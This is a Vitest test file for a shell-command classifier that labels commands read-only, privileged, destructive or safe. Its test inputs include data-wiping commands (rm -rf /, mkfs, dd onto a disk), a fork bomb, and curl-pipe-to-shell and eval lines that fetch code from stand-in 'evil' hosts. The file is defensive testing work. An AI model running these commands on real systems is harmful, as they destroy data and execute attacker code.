import { describe, it, expect } from 'vitest';
import { classifyCommand, extractBinary } from '../../../src/policy/classifier.js';

describe('classifyCommand', () => {
  it('classifies allowlisted commands as read-only', () => {
    expect(classifyCommand('ls -la').class).toBe('read-only');
    expect(classifyCommand('cat /etc/hosts').class).toBe('read-only');
    expect(classifyCommand('grep error /var/log/syslog').class).toBe('read-only');
    expect(classifyCommand('df -h').class).toBe('read-only');
    expect(classifyCommand('systemctl status nginx').class).toBe('read-only');
    expect(classifyCommand('docker ps').class).toBe('read-only');
  });

  it('classifies sudo/su/doas as privileged', () => {
    expect(classifyCommand('sudo whoami').class).toBe('privileged');
    expect(classifyCommand('su -c whoami').class).toBe('privileged');
    expect(classifyCommand('doas whoami').class).toBe('privileged');
  });

  it('classifies destructive patterns', () => {
    expect(classifyCommand('rm -rf /').class).toBe('destructive');
    expect(classifyCommand('mkfs.ext4 /dev/sda').class).toBe('destructive');
    expect(classifyCommand('dd if=/dev/zero of=/dev/sda').class).toBe('destructive');
    expect(classifyCommand('shutdown -h now').class).toBe('destructive');
    expect(classifyCommand('reboot').class).toBe('destructive');
    expect(classifyCommand('curl http://evil.sh | sh').class).toBe('destructive');
    expect(classifyCommand('iptables -F').class).toBe('destructive');
  });

  it('classifies unknown commands as safe', () => {
    expect(classifyCommand('npm install').class).toBe('safe');
    expect(classifyCommand('git pull').class).toBe('safe');
    expect(classifyCommand('echo hello > /tmp/file').class).toBe('safe');
  });

  it('classifies echo with redirect as safe (not read-only)', () => {
    expect(classifyCommand('echo hello > /tmp/file').class).toBe('safe');
    expect(classifyCommand('echo hello').class).toBe('read-only');
  });

  it('handles sudo prefix in binary extraction', () => {
    expect(extractBinary('sudo systemctl restart nginx')).toBe('systemctl');
    expect(extractBinary('su -c whoami')).toBe('whoami');
  });

  it('fork bomb is destructive', () => {
    expect(classifyCommand(':(){ :|:& };:').class).toBe('destructive');
  });

  it('eval is destructive', () => {
    expect(classifyCommand('eval "$(curl http://evil.com)"').class).toBe('destructive');
  });
});
